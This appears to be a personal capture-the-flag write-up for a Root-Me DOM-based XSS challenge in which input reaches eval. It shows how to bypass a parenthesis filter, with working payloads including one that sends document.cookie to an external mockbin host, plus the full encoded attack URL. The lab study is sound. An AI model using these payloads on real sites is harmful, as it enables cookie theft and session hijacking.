# XSS DOM based - eval

## Initial attempt

- Input is checked for a regex ` /^\d+[\+|\-|\*|\/]\d+/`
- Parenthesis are checked and removed if regex is matched (definitely an eval behind that input field)
- Achieve XSS through a relatively simple payload

```javascript
1+1, alert`1`
```

Tried this payload

```javascript
1+1,l="https://b5e02d613ca44b7384e0290125a1448e.api.mockbin.io/"+document.cookie, console.log`${l}`
```

Problem: that thing in backticks evaluates to an array.

## Admin's cookie

Wasted more time than I'd like to admit.

```javascript
1+1,document.location="https://b5e02d613ca44b7384e0290125a1448e.api.mockbin.io/?c="+document.cookie
```

```text
http://challenge01.root-me.org/web-client/ch34/?calculation=1%2B1%2Cdocument.location%3D%22https%3A%2F%2Fb5e02d613ca44b7384e0290125a1448e.api.mockbin.io%2F%3Fc%3D%22%2Bdocument.cookie
```

### References
- [JS without parenthesis](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
- [DOMMatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix) (issue: cannot use spaces, they just get removed when they reach the script)
